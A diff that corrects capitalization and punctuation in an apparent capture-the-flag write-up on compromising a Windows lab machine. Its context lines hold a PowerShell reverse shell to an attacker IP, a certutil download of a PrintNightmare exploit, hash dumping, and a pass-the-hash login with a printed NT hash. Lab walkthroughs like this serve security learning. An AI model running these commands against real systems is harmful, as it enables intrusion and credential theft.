@@ -78,7 +78,7 @@ password: sand_0873959498
 ![hascat](/assets/image/hashcat.png)
 ## Enumerate shares
 Now that we have valid credentials , we can further enumerate to gather additional information.
-using enum4linux to enumerate users, groups, shares, and other domain-related information. 
+Using enum4linux to enumerate users, groups, shares, and other domain-related information. 
 ```
 enum4linux -u enterprise-security -p 'sand_0873959498' -a 10.49.146.193
 
@@ -103,7 +103,7 @@ PurgeIrrelevantData_1826.ps1 conatins:
 rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
 ```
 
-Assuming that the script can be modified using the low privilege we can change the content of the file to get a reverse shell . i will be using a powershell reverse shell script . It will establish **reverse TCP shell** from the target machine back to the attacker.
+Assuming that the script can be modified using the low privilege we can change the content of the file to get a reverse shell . I will be using a powershell reverse shell script . It will establish **reverse TCP shell** from the target machine back to the attacker.
 ```
 #rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue  
 $LHOST = "192.168.145.147"; $LPORT = 4444;   
@@ -121,7 +121,7 @@ $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close();
 $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
 ```
 
-Starting listener 
+Starting listener .
 ```
 nc -lvnp 4444
 ```
@@ -145,7 +145,7 @@ Download the file from here https://github.com/calebstewart/CVE-2021-1675/blob/m
 python3 -m http.server 80
 ```
 
-The next step is downloading the file onto the target system then  Import the PrintNightmare  script into the current PowerShell session, making its functions available for execution and lastly trigger the exploit . 
+The next step is downloading the file onto the target system then  import the PrintNightmare  script into the current PowerShell session, making its functions available for execution and lastly trigger the exploit . 
 
 ```
 certutil -urlcache -split -f http://192.168.145.147/nightmare.ps1 C:\Users\enterprise-security\Downloads\nightmare.ps1
@@ -164,7 +164,7 @@ After successfully escalating privileges and obtaining administrative access, us
 
 ![dumping hashes](/assets/image/secretsdump.png)
 
-After extracting the administrator hash instead of cracking it i can perform pass-the-hash attack and authenticate directly as the Administrator using Impacket’s **`wmiexec.py`** . 
+After extracting the administrator hash instead of cracking it I can perform pass-the-hash attack and authenticate directly as the Administrator using Impacket’s **`wmiexec.py`** . 
 
 ```
 wmiexec.py vulnnet.local/administrator@10.49.146.193 -hashes aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1
